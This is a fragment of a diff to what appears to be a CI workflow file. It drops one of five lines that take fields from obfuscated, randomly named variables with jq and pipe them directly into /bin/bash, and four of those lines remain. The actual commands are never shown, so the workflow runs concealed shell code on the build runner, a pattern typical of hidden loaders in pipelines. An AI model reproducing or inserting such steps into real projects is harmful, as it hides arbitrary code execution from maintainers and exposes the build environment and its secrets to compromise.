@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$uigy71105" | jq -r .h1460 | /bin/bash
           echo $wh45284 | jq -r .v6622 | /bin/bash
           printf '%s' "$ip7" | jq -r .ynl684 | /bin/bash
-          echo $gaez08699 | jq -r .ggjed33 | /bin/bash
           echo $lj3771 | jq -r .zcmpl10457 | /bin/bash
 
       - name: Save results
